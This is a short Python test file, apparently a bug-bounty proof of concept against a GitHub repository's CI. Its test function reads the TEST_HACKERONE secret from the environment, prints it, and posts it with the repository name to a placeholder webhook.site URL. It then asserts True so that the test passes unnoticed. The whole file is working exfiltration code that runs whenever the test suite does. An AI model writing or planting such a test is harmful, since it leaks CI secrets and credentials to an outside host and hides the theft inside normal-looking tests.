import os
import requests
import json
from datetime import datetime

def test_exploit():
    """Exploit to capture TEST_HACKERONE secret"""
    
    # Get environment variables
    secret = os.environ.get('TEST_HACKERONE', '')
    repo = os.environ.get('GITHUB_REPOSITORY', '')
    
    # Your webhook URL
    webhook = "https://webhook.site/YOUR-WEBHOOK-ID"
    
    print("=" * 50)
    print("EXPLOITING BASE REPOSITORY")
    print("=" * 50)
    print(f"Repository: {repo}")
    print(f"Secret length: {len(secret)}")
    print(f"Secret value: {secret}")
    print("=" * 50)
    
    # Exfiltrate
    payload = {
        "exploit": "TEST_HACKERONE_captured",
        "repository": repo,
        "secret": secret,
        "timestamp": datetime.utcnow().isoformat()
    }
    
    try:
        response = requests.post(webhook, json=payload)
        print(f"✅ Exfiltrated! Status: {response.status_code}")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    # Make test pass
    assert True
